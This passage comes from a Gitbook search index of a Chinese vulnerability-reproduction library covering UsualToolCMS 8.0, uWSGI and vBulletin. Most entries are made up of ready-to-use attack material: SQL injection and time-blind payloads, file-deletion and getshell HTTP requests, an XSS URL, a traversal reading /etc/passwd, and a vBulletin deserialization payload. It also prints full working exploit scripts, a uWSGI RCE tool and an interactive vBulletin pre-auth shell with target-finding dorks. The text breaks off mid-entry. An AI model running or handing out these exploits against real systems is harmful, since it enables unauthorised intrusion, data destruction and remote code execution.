参考链接 https://xz.aliyun.com/t/8100 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:29 "},"Web安全/UsualToolcms/UsualToolcms 8.0 a_users_level.php 后台int型注入/UsualToolcms 8.0 a_users_level.php 后台int型注入.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 a_users_level.php 后台int型注入/UsualToolcms 8.0 a_users_level.php 后台int型注入.html","title":"UsualToolcms 8.0 a_users_level.php 后台int型注入","keywords":"","body":"UsualToolcms 8.0 a_users_level.php 后台int型注入 一、漏洞简介 后台a_book_category.php int型注入 二、漏洞影响 UsualToolcms 8.0 三、复现过程 该php文件下另外一个触发点： poc http://www.0-sec.org/cmsadmin/a_book_category.php?t=mon&id=-1%20union%20select%201,user(),3%23 参考链接 https://xz.aliyun.com/t/8100 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:30 "},"Web安全/UsualToolcms/UsualToolcms 8.0 a_users_level.php 后台盲注/UsualToolcms 8.0 a_users_level.php 后台盲注.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 a_users_level.php 后台盲注/UsualToolcms 8.0 a_users_level.php 后台盲注.html","title":"UsualToolcms 8.0 a_users_level.php 后台盲注","keywords":"","body":"UsualToolcms 8.0 后台盲注 一、漏洞简介 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞分析 ./cmsadmin/a_users_level.php第19行和第26行，id参数可控 从get处获取id参数，id存在无任何过滤，当postt id时，通过sqlcheck函数进行过滤，来到文件./class/UsualToolCMS_INC.php第33行，将(\\',\\,\\\",null)转义，34行调用sqlchecks函数，比没过滤sql，然而a_users_level.php第19行id不是字符 复现 可以利用时间盲注来进行sql注入攻击，payload如下： a.当前数据库：http://0-sec.org:8080/UsualToolCMS/cmsadmin/a_users_level.php?x=m&id=2 and if(ascii(substr(user(),1,1))=114,sleep(6),1) b.表：http://0-sec.org:8080/UsualToolCMS/cmsadmin/a_users_level.php?x=m&id=2 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>30,sleep(6),1) 时间盲注验证脚本 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:30 "},"Web安全/UsualToolcms/UsualToolcms 8.0 myup.php 前台任意文件删除/UsualToolcms 8.0 myup.php 前台任意文件删除.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 myup.php 前台任意文件删除/UsualToolcms 8.0 myup.php 前台任意文件删除.html","title":"UsualToolcms 8.0 myup.php 前台任意文件删除","keywords":"","body":"UsualToolcms前台任意文件删除 一、漏洞简介 前台myup.php文件最后一段存在任意文件删除 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞点：http://0-sec.org/myup.php 第47行只对..精心过滤，我仍然能任意删除网站内部的文件，直接构造poc， POST /UsualToolCMS/myup.php HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 25 get=delimg&imgurl=./1.ph Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:32 "},"Web安全/UsualToolcms/UsualToolcms 8.0 前台sql/UsualToolcms 8.0 前台sql.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 前台sql/UsualToolcms 8.0 前台sql.html","title":"UsualToolcms 8.0 前台sql","keywords":"","body":"UsualToolcms 8.0 前台sql 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 search.php $key=UsualToolCMS::sqlcheck($_GET[\"key\"]); $navname=\"search\"; require_once(dirname(__FILE__).'/'.'mytop.php'); //搜索记录 if(!empty($key)): $asql=\"SELECT * FROM `cms_search` WHERE keyword ='$key'\"; $adata=mysqli_query($mysqli,$asql); if(mysqli_num_rows($adata)>0): $mysqli->query(\"UPDATE `cms_search` SET `hit`=hit+1 WHERE keyword ='$key' and lang='$language'\"); else: $mysqli->query(\"INSERT INTO `cms_search` (`lang`,`keyword`) VALUES ('$language','$key')\"); $key被sqlcheck函数过滤了，让我们看下这个函数 function sqlchecks($StrPost){ $StrPost=str_replace(\"'\",\"’\",$StrPost); $StrPost=str_replace('\"','“',$StrPost); $StrPost=str_replace(\"(\",\"（\",$StrPost); $StrPost=str_replace(\")\",\"）\",$StrPost); $StrPost=str_replace(\"@\",\"#\",$StrPost); $StrPost=str_replace(\"/*\",\"\",$StrPost); $StrPost=str_replace(\"*/\",\"\",$StrPost); return $StrPost; } 如果没有Url编码的话这里应该是不存在漏洞的了，仔细看上面的代码，数据库操作中还有一个$language,我们追踪下$language吧 全局查找，直接找到其定义的地方 conn.php if(!empty($_COOKIE['UTCMSLanguage'])):$language=$_COOKIE['UTCMSLanguage'];else:$language=$indexlanguage;endif; $language没有经过任何过滤就从Cookie传了进来 这就简单咯 复现 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:33 "},"Web安全/UsualToolcms/UsualToolcms 8.0 后台GETSHELL/UsualToolcms 8.0 后台GETSHELL.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 后台GETSHELL/UsualToolcms 8.0 后台GETSHELL.html","title":"UsualToolcms 8.0 后台GETSHELL","keywords":"","body":"UsualToolcms 8.0 后台GETSHELL 一、漏洞简介 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 洞点:http://0-sec.org/cmsadmin/a_lang.php 13行未对$lg做判断 点击保存时抓包需要修改url处的lg参数这样就上传到跟目录了，再在post 参数的en后面加入 en\"}, POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&lg=../1.php HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_langx.php?lg=lg-en.json Cookie: navleft=21; UTCMSLanguage=zh; PHPSESSID=1r5kk3jieflfbnseav3e5dnclo X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 9189 submit=保存语言包&keys[]=language&values[]=en\"},&keys[]=charset&values[]=utf-8&keys[]=speak&values[]=English&keys[]=web&values[]=UsualToolCMS&key[]=index&value[]=Home&key[]=article&value[]=Article&key[]=product&value[]=Product&key[]=picture&value[]=Picture&key[]=atlas&value[]=Atlas&key[]=contact&value[]=Contact&key[]=about&value[]=About&key[]=forum&value[]=Forum&key[]=register&value[]=Register&key[]=login&value[]=Login&key[]=news&value[]=News&key[]=job&value[]=Job&key[]=wages&value[]=Wages&key[]=application&value[]=Application&key[]=resume&value[]=Resume&key[]=shopcart&value[]=Shopcart&key[]=account&value[]=Account&key[]=member&value[]=Member&key[]=up&value[]=Up&key[]=down&value[]=Down&key[]=more&value[]=More&key[]=new&value[]=New&key[]=authorize&value[]=Authorize&key[]=authenticating&value[]=Authenticating&key[]=qq&value[]=QQ&key[]=membercenter&value[]=Member&key[]=username&value[]=Username&key[]=password&value[]=Password&key[]=forgotpass&value[]=Forgot&key[]=search&value[]=Search&key[]=detail&value[]=Detail&key[]=size&value[]=Size&key[]=spec&value[]=Spec&key[]=color&value[]=Color&key[]=aboutus&value[]=About Us&key[]=newgoods&value[]=New Product&key[]=topgoods&value[]=Top Product&key[]=link&value[]=Link&key[]=confirm&value[]=Confirm&key[]=email&value[]=Email&key[]=title&value[]=Title&key[]=content&value[]=Content&key[]=avatar&value[]=Avatar&key[]=sex&value[]=Sex&key[]=man&value[]=Man&key[]=woman&value[]=Woman&key[]=address&value[]=ADD.&key[]=tel&value[]=Tel&key[]=fax&value[]=Fax&key[]=introduction&value[]=Intro&key[]=validatecode&value[]=Captcha&key[]=changeit&value[]=Change it&key[]=order&value[]=Order&key[]=writeorder&value[]=Write Order&key[]=menu&value[]=Menu&key[]=balance&value[]=Balance&key[]=level&value[]=Level&key[]=writearticles&value[]=Write Articles&key[]=articlemanagement&value[]=Article Admin&key[]=articlebrowse&value[]=Article Browse&key[]=writeonline&value[]=Add New&key[]=payment&value[]=Payment&key[]=registrationtime&value[]=Reg Time&key[]=lastlogintime&value[]=Last Login&key[]=fullname&value[]=Full Name&key[]=privileges:discount&value[]=Privileges:Discount&key[]=state&value[]=State&key[]=source&value[]=Source&key[]=ordernumber&value[]=Order No.&key[]=money&value[]=Money&key[]=time&value[]=Time&key[]=finish&value[]=Finish&key[]=unpaid&value[]=Unpaid&key[]=deliver&value[]=Deliver&key[]=refund&value[]=Refund&key[]=goods&value[]=Goods&key[]=charge&value[]=Charge&key[]=other&value[]=Other&key[]=ordertime&value[]=Order Time&key[]=voucher&value[]=Voucher&key[]=customer&value[]=Customer&key[]=zipcode&value[]=Zip Code&key[]=logistics&value[]=Logistics&key[]=logisticscompany&value[]=Company&key[]=logisticsnumber&value[]=Number&key[]=logisticsdetails&value[]=Details&key[]=paymentmethod&value[]=Method&key[]=alipay&value[]=Alipay&key[]=wechatpay&value[]=Tencent Wechat&key[]=paypal&value[]=Paypal&key[]=waitinganswer&value[]=Waiting&key[]=answered&value[]=Answered&key[]=question&value[]=Question&key[]=reply&value[]=Reply&key[]=tencentaccount&value[]=Tencent&key[]=weiboaccount&value[]=Weibo&key[]=wechataccount&value[]=Wechat&key[]=binded&value[]=Binded&key[]=untie&value[]=Untie&key[]=quantity&value[]=Qty&key[]=parameter&value[]=Parm&key[]=total&value[]=Total&key[]=submit&value[]=Submit&key[]=delete&value[]=Del&key[]=unit&value[]=USD&key[]=actual&value[]=Actual&key[]=feedback&value[]=Feedback&key[]=otheraccount&value[]=Other Accounts&key[]=out&value[]=Out&key[]=ranking&value[]=Ranking&key[]=recommend&value[]=Recommend&key[]=tag&value[]=Tag&key[]=tags&value[]=Tags&key[]=read&value[]=Read&key[]=productdetails&value[]=Product Details&key[]=service&value[]=Service&key[]=category&value[]=Category&key[]=allcategory&value[]=All Category&key[]=stock&value[]=Stock&key[]=price&value[]=Price&key[]=sale&value[]=Sale&key[]=loginview&value[]=Login View&key[]=readme&value[]=Read Me&key[]=popularity&value[]=Popularity&key[]=details&value[]=Details&key[]=message&value[]=Message&key[]=original&value[]=Original&key[]=author&value[]=Author&key[]=pass&value[]=Pass&key[]=audit&value[]=Audit&key[]=return&value[]=Return&key[]=yes&value[]=Yes&key[]=no&value[]=No&key[]=modify&value[]=Modify&key[]=articlemodify&value[]=Article Modify&key[]=type&value[]=Type&key[]=moreupload&value[]=Up to upload&key[]=success&value[]=Success&key[]=fail&value[]=Fail&key[]=upload&value[]=Upload&key[]=uploadtime&value[]=Upload Time&key[]=contactus&value[]=Contact Us&key[]=previouspage&value[]=Prev&key[]=nextpage&value[]=Next&key[]=firstpage&value[]=First&key[]=lastpage&value[]=Last&key[]=totalpage&value[]=Total&key[]=currentpage&value[]=Current&key[]=buy&value[]=Buy&key[]=mailverify&value[]=Email validation&key[]=welcome&value[]=Welcome&key[]=close&value[]=closed&key[]=findpassword&value[]=Find Password&key[]=contactmanager&value[]=Contact Manager&key[]=orderdetaillogin&value[]=For order details,please visit the website.&key[]=enterusername&value[]=Please enter username!&key[]=enterpassword&value[]=Please enter password!&key[]=enteremail&value[]=Please enter Email!&key[]=emailerr&value[]=Email error!&key[]=entertitle&value[]=Please enter title!&key[]=entercontent&value[]=Please enter content!&key[]=selecttype&value[]=Type must be selected!&key[]=enterauthor&value[]=Please enter author!&key[]=enterpasswords&value[]=Please confirm the password!&key[]=passworderr&value[]=The codes don&key[]=entercaptcha&value[]=Please enter captcha!&key[]=captchaerr&value[]=Captcha error!&key[]=mailsenderr&value[]=Mail not sent!&key[]=mailok&value[]=Please check email!&key[]=pleasemailverify&value[]=Please check email for verification!&key[]=mailverifycode&value[]=Email Authentication Code&key[]=mailcopylink&value[]=Please copy the following link&key[]=totalnum&value[]=Total Num&key[]=updateok&value[]=Update successed!&key[]=updateno&value[]=Failed to update!&key[]=payok&value[]=Successful payment!&key[]=payno&value[]=Payment Failed!&key[]=createempty&value[]=Required field is empty!&key[]=createok&value[]=Create successed!&key[]=createno&value[]=Failed to create!&key[]=gotopay&value[]=Go to pay!&key[]=untieok&value[]=Untie successed!&key[]=untieno&value[]=Untie failed!&key[]=delok&value[]=Delete successed!&key[]=delno&value[]=Delete failed!&key[]=regclose&value[]=Website registration closed!&key[]=regmailerr&value[]=Account or email registered!&key[]=loginusererr&value[]=Account does not exist!&key[]=loginpasserr&value[]=Account or password does not match!&key[]=administratorreply&value[]=The administrator has not responded, please wait patiently.&key[]=noscript&value[]=Sorry, your browser disabled JavaScript, it may not be able to use some of the site&key[]=readmecontent&value[]=We guarantee that the outer packing of the goods is in good condition at the time of shipment. When you receive the goods, please carefully check whether the invoice and the goods are consistent with the delivery order. If you find that the goods are missing or damaged, please contact our customer service department on the spot when the delivery personnel are still on the scene; If you find that the package is damaged or the goods are damaged in transit, please point out and refuse to accept it on the spot. After refusal, please call our customer service. If you have signed for it or someone else has signed for it, you will be considered as the packaging, quantity and content of the goods. I will not be able to accept.&key[]=copyright&value[]=Copyright&key[]=cssdisplay&value[]=none&key[]=test&value[]=Test 请将上面post数据包内容进行url编码 csrf配合上面的后台getshell history.pushState('', '', '/') Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:34 "},"Web安全/UsualToolcms/UsualToolcms 8.0 后台反射型XSS/UsualToolcms 8.0 后台反射型XSS.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 后台反射型XSS/UsualToolcms 8.0 后台反射型XSS.html","title":"UsualToolcms 8.0 后台反射型XSS","keywords":"","body":"UsualToolcms 8.0 后台反射型XSS 一、漏洞简介 二、漏洞影响 UsualToolcms 8.0 三、复现过程 poc https://www.0-sec.org/cmsadmin/a_auth.php?do=update&l=%22%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E 参考链接 https://xz.aliyun.com/t/8100 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:35 "},"Web安全/UsualToolcms/UsualToolcms 8.0 系统重装漏洞/UsualToolcms 8.0 系统重装漏洞.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 系统重装漏洞/UsualToolcms 8.0 系统重装漏洞.html","title":"UsualToolcms 8.0 系统重装漏洞","keywords":"","body":"UsualToolcms 8.0 系统重装漏洞 一、漏洞简介 无验证, 在安装cms完成后 并不会自动删除文件 又不会生成lock来判断是否安装过了。 导致了可以直接重装过 setup/index.php 安装地址 二、漏洞影响 UsualToolCMS大众版5.0 UsualToolcms 8.0 三、复现过程 alert('数据库设置成功!');window.location.href='?l=sql'\"; } if($t==\"testdb\"){ $dbhost=$_POST[\"dbhost\"]; $dbname=$_POST[\"dbname\"]; $dbuser=$_POST[\"dbuser\"]; $dbpass=$_POST[\"dbpass\"]; $mysqli=new mysqli($dbhost,$dbuser,$dbpass,$dbname); echo \"alert('测试完成!\".$mysqli->connect_error.\"');window.location.href='?l=sqlback'\"; } if($t==\"sqlback\"){ include('../sql_db.php'); $sqlcontent=$_POST['sqlcontent']; $res=$mysqli -> multi_query($sqlcontent); echo \"alert('数据库结构规划完成!');window.location.href='?l=setup'\"; } if($t==\"update\"){ include('../sql_db.php'); $authcode=$_POST[\"authcode\"];$webname=$_POST[\"webname\"]; $weblogo=$_POST[\"weblogo\"]; $weburl=$_POST[\"weburl\"]; $template=$_POST[\"template\"]; $webisclose=$_POST[\"webisclose\"]; $develop=$_POST[\"develop\"]; $articlelistnum=$_POST[\"articlelistnum\"]; $indexarticlenum=$_POST[\"indexarticlenum\"]; $indexarticlerenum=$_POST[\"indexarticlerenum\"]; $articlehitnum=$_POST[\"articlehitnum\"]; $goodslistnum=$_POST[\"goodslistnum\"]; $indexgoodsnum=$_POST[\"indexgoodsnum\"]; $indexgoodsrenum=$_POST[\"indexgoodsrenum\"]; $goodshitnum=$_POST[\"goodshitnum\"]; $article=$_POST[\"article\"]; $goods=$_POST[\"goods\"]; $messagebook=$_POST[\"messagebook\"]; $orders=$_POST[\"orders\"]; $members=$_POST[\"members\"]; $usercookname=$_POST[\"usercookname\"]; $sqls=\"INSERT INTO `cms_setup` (authcode,webname,weblogo,weburl,template,webisclose,develop,articlelistnum,indexarticlenum, indexarticlerenum,articlehitnum,goodslistnum,indexgoodsnum,indexgoodsrenum,goodshitnum,article,goods,messagebook,orders,members,usercookname,installtime) VALUES ('$authcode','$webname','$weblogo','$weburl','$template','$webisclose','$develop','$articlelistnum','$indexarticlenum','$indexarticlerenum','$articlehitnum','$goodslistnum','$indexgoodsnum','$indexgoodsrenum','$goodshitnum','$article','$goods','$messagebook','$orders','$members','$usercookname',now())\"; if ($mysqli->query($sqls) == TRUE) { echo \"alert('基础设置完成!');window.location.href='?l=welcome'\"; }else{ echo \"alert('未设置成功!请重填!');window.location.href='?l=setup'\"; } }?> UsualToolcsm需要先设置数据库账号密码才可以安装sql_db.php文件。 这边是判断数据库连接是否成功， 如果成功执行下一步， 如果不成功反回未设置成功!请重填 p:437-438 成功安装以后反回一个默认账号密码 echo\"后台默认账号: usualtool\"; echo\"后台默认密码: 123456\"; 直接下一步就可以因为sql_db.php是提前设置好账号密码的 http://0-sec.org/UsualToolCMS/setup/ image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:36 "},"Web安全/UsualToolcms/UsualToolcms 8.0 绕过后台验证码爆破/UsualToolcms 8.0 绕过后台验证码爆破.html":{"url":"Web安全/UsualToolcms/UsualToolcms 8.0 绕过后台验证码爆破/UsualToolcms 8.0 绕过后台验证码爆破.html","title":"UsualToolcms 8.0 绕过后台验证码爆破","keywords":"","body":"UsualToolcms 8.0 绕过后台验证码爆破 一、漏洞简介 可通过删除验证码参数，进行暴力破解 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞点:http://0-sec.org/cmsadmin/ 后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功 1.默认情况下登陆数据包 删除ucode参数和cookie后登陆，直接登陆成功 通过burp爆破后台密码 POST /UsualToolCMS/cmsadmin/a_login.php?do=login HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_login.php X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 23 uuser=admin&upass=admi Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:37 "},"Web安全/UsualToolcms/UsualToolCMS-8.0 a_templetex.php sql注入漏洞/UsualToolCMS-8.0 a_templetex.php sql注入漏洞.html":{"url":"Web安全/UsualToolcms/UsualToolCMS-8.0 a_templetex.php sql注入漏洞/UsualToolCMS-8.0 a_templetex.php sql注入漏洞.html","title":"UsualToolCMS-8.0 a_templetex.php sql注入漏洞","keywords":"","body":"UsualToolCMS-8.0 a_templetex.php sql注入漏洞 payload: a_templetex.php?t=open&id=1&paths=templete/index' where id=1 and if(ascii(substring(user(),1,1))>0,sleep(5),1)--+ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:25 "},"Web安全/uWSGI/（CVE-2018-7490）uWSGI PHP目录穿越漏洞/（CVE-2018-7490）uWSGI PHP目录穿越漏洞.html":{"url":"Web安全/uWSGI/（CVE-2018-7490）uWSGI PHP目录穿越漏洞/（CVE-2018-7490）uWSGI PHP目录穿越漏洞.html","title":"（CVE-2018-7490）uWSGI PHP目录穿越漏洞","keywords":"","body":"（CVE-2018-7490）uWSGI PHP目录穿越漏洞 一、漏洞简介 uWSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言。 uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT_ROOT检测，导致用户可以通过..%2f来跨越目录，读取或运行DOCUMENT_ROOT目录以外的文件。 二、漏洞影响 uWSGI \\ 三、复现过程 访问http://www.0-sec.org:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd，成功读取文件： uWSGIPHP目录穿越漏洞/media/rId24.png) 参考链接 https://github.com/vulhub/vulhub/blob/master/uwsgi/CVE-2018-7490/README.zh-cn.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:39 "},"Web安全/uWSGI/uWSGI 未授权访问漏洞/uWSGI 未授权访问漏洞.html":{"url":"Web安全/uWSGI/uWSGI 未授权访问漏洞/uWSGI 未授权访问漏洞.html","title":"uWSGI 未授权访问漏洞","keywords":"","body":"uWSGI 未授权访问漏洞 一、漏洞简介 WSGI是一款Web应用程序服务器，它实现了WSGI、uwsgi和http等协议，并支持通过插件来运行各种语言，通常被用于运行Python WEB应用。uwsgi除了是应用容器的名称之外，它和Fastcgi之类的一样，也是前端server与后端应用容器之间的一个交流标准。目前nginx，apache也支持uwsgi协议进行代理转发请求。 uWSGI支持通过魔术变量（Magic Variables）的方式动态配置后端Web应用。如果其端口暴露在外，攻击者可以构造uwsgi数据包，并指定魔术变量UWSGI_FILE，运用exec://协议执行任意命令。 二、漏洞影响 三、复现过程 使用poc.py，执行命令python poc.py -u your-ip:8000 -c \"touch /tmp/success\"： 执行docker-compose exec web bash进入容器，可见/tmp/success已经成功执行： poc.py #!/usr/bin/python # coding: utf-8 ###################### # Uwsgi RCE Exploit ###################### # Author: wofeiwo@80sec.com # Created: 2017-7-18 # Last modified: 2018-1-30 # Note: Just for research purpose import sys import socket import argparse import requests def sz(x): s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0') s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex') return s[::-1] def pack_uwsgi_vars(var): pk = b'' for k, v in var.items() if hasattr(var, 'items') else var: pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8') result = b'\\x00' + sz(pk) + b'\\x00' + pk return result def parse_addr(addr, default_port=None): port = default_port if isinstance(addr, str): if addr.isdigit(): addr, port = '', addr elif ':' in addr: addr, _, port = addr.partition(':') elif isinstance(addr, (list, tuple, set)): addr, port = addr port = int(port) if port else port return (addr or '127.0.0.1', port) def get_host_from_url(url): if '//' in url: url = url.split('//', 1)[1] host, _, url = url.partition('/') return (host, '/' + url) def fetch_data(uri, payload=None, body=None): if 'http' not in uri: uri = 'http://' + uri s = requests.Session() # s.headers['UWSGI_FILE'] = payload if body: import urlparse body_d = dict(urlparse.parse_qsl(urlparse.urlsplit(body).path)) d = s.post(uri, data=body_d) else: d = s.get(uri) return { 'code': d.status_code, 'text': d.text, 'header': d.headers } def ask_uwsgi(addr_and_port, mode, var, body=''): if mode == 'tcp': s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(parse_addr(addr_and_port)) elif mode == 'unix': s = socket.socket(socket.AF_UNIX) s.connect(addr_and_port) s.send(pack_uwsgi_vars(var) + body.encode('utf8')) response = [] # Actually we dont need the response, it will block if we run any commands. # So I comment all the receiving stuff. # while 1: # data = s.recv(4096) # if not data: # break # response.append(data) s.close() return b''.join(response).decode('utf8') def curl(mode, addr_and_port, payload, target_url): host, uri = get_host_from_url(target_url) path, _, qs = uri.partition('?') if mode == 'http': return fetch_data(addr_and_port+uri, payload) elif mode == 'tcp': host = host or parse_addr(addr_and_port)[0] else: host = addr_and_port var = { 'SERVER_PROTOCOL': 'HTTP/1.1', 'REQUEST_METHOD': 'GET', 'PATH_INFO': path, 'REQUEST_URI': uri, 'QUERY_STRING': qs, 'SERVER_NAME': host, 'HTTP_HOST': host, 'UWSGI_FILE': payload, 'SCRIPT_NAME': target_url } return ask_uwsgi(addr_and_port, mode, var) def main(*args): desc = \"\"\" This is a uwsgi client & RCE exploit. Last modifid at 2018-01-30 by wofeiwo@80sec.com \"\"\" elog = \"Example：uwsgi_exp.py -u 1.2.3.4:5000 -c \\\"echo 111>/tmp/abc\\\"\" parser = argparse.ArgumentParser(description=desc, epilog=elog) parser.add_argument('-m', '--mode', nargs='?', default='tcp', help='Uwsgi mode: 1. http 2. tcp 3. unix. The default is tcp.', dest='mode', choices=['http', 'tcp', 'unix']) parser.add_argument('-u', '--uwsgi', nargs='?', required=True, help='Uwsgi server: 1.2.3.4:5000 or /tmp/uwsgi.sock', dest='uwsgi_addr') parser.add_argument('-c', '--command', nargs='?', required=True, help='Command: The exploit command you want to execute, must have this.', dest='command') if len(sys.argv) 参考链接 https://github.com/vulhub/vulhub/blob/master/uwsgi/unacc/README.zh-cn.md Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:38 "},"Web安全/vBulletin/（CVE-2015-7808）VBulletin 远程命令执行漏洞/（CVE-2015-7808）VBulletin 远程命令执行漏洞.html":{"url":"Web安全/vBulletin/（CVE-2015-7808）VBulletin 远程命令执行漏洞/（CVE-2015-7808）VBulletin 远程命令执行漏洞.html","title":"（CVE-2015-7808）VBulletin 远程命令执行漏洞","keywords":"","body":"（CVE-2015-7808）远程命令执行漏洞 一、漏洞简介 二、漏洞影响 VBulletin VBulletin 5.1.4 - 5.1.9 三、复现过程 $ php functions['free_result'] = 'assert'; } } class vB_dB_Result { protected $db; protected $recordset; public function __construct() { $this->db = new vB_Database_MySQL(); $this->recordset = \"phpinfo()\"; } } print urlencode(serialize(new vB_dB_Result())) . \"n\"; eof http://0-sec.org/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:40 "},"Web安全/vBulletin/（CVE-2019-16759）vBulletin 5.x 远程命令执行漏洞/（CVE-2019-16759）vBulletin 5.x 远程命令执行漏洞.html":{"url":"Web安全/vBulletin/（CVE-2019-16759）vBulletin 5.x 远程命令执行漏洞/（CVE-2019-16759）vBulletin 5.x 远程命令执行漏洞.html","title":"（CVE-2019-16759）vBulletin 5.x 远程命令执行漏洞","keywords":"","body":"（CVE-2019-16759）vBulletin 5.x 0day pre-auth RCE exploit 一、漏洞简介 二、漏洞影响 影响版本：vBulletin 5.0.0~5.5.4 三、复现过程 poc如下: #!/usr/bin/python # # vBulletin 5.x 0day pre-auth RCE exploit # # This should work on all versions from 5.0.0 till 5.5.4 # # Google Dorks: # - site:*.vbulletin.net # - \"Powered by vBulletin Version 5.5.4\" import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s \" % sys.argv[0]) params = {\"routestring\":\"ajax/render/widget_php\"} while True: try: cmd = raw_input(\"vBulletin$ \") params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"'); exit;\" r = requests.post(url = sys.argv[1], data = params) if r.status_code == 200: print r.text else: sys.exit(\"Exploit failed! :(\") except KeyboardInterrupt: sys.exit(\" Closing shell...\") except Exception, e: sys.exit(str(e)) 将poc代码修改为python3使用的代码，并添加代理使用burpsuite抓包。修改的poc代码如下： # -*-coding:utf-8 -*- import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s \" % sys.argv[0]) proxies ={ \"http\":\"http://127.0.0.1:8080/\" } params = {\"routestring\":\"ajax/render/widget_php\"} while True: try: cmd = input(\">>>Shell= \") params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"'); exit;\" r = requests.post(url = sys.argv[1], data = params, proxies=proxies) if r.status_code == 200: print(r.text) else: sys.exit(\"Exploit failed! :(\") except KeyboardInterrupt: sys.exit(\"\\nClosing shell...\") except Exception as e: sys.exit(str(e)) 远程代码执行漏洞的触发点是未经过验证的用户通过向index.php发送routestring参数，当routesting参数是ajax/render/widget_php，通过widgetConfig[code]执行远程代码，格式为echo shell_exec(\\'\\\"+cmd+\\\"\\'); exit; image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:08:40 "},"Web安全/vBulletin/（CVE-2019-17132）vBulletin 5.0 5.5.4-'updateAvatar'身份验证的远程代码执行漏洞/（CVE-2019-17132）vBulletin 5.0 5.5.4-'updateAvatar'身份验证的远程代码执行漏洞.html":{"url":"Web安全/vBulletin/（CVE-2019-17132）vBulletin 5.0 5.5.4-'updateAvatar'身份验证的远程代码执行漏洞/（CVE-2019-17132）vBulletin 5.0 5.5.4-'updateAvatar'身份验证的远程代码执行漏洞.html","title":"（CVE-2019-17132）vBulletin 5.0 5.5.4-'updateAvatar'身份验证的远程代码执行漏洞","keywords":"","body":"（CVE-2019-17132）vBulletin 5.0 \\ 一、漏洞简介 用户输入更新头像的的时候，前未正确验证提交的\"数据[扩展]\"和\"数据[文件数据]\"参数就发送到了\" ajax / api / user / updateavatar\"，导致此突破的产生 利用此突破可以插入和执行任意php代码。 成功利用此突破需要\"将头像另存为Files（头像保存为文件）\"选项要启用（可选情况下少量）。 二、漏洞影响 三、复现过程 \\n\"; print 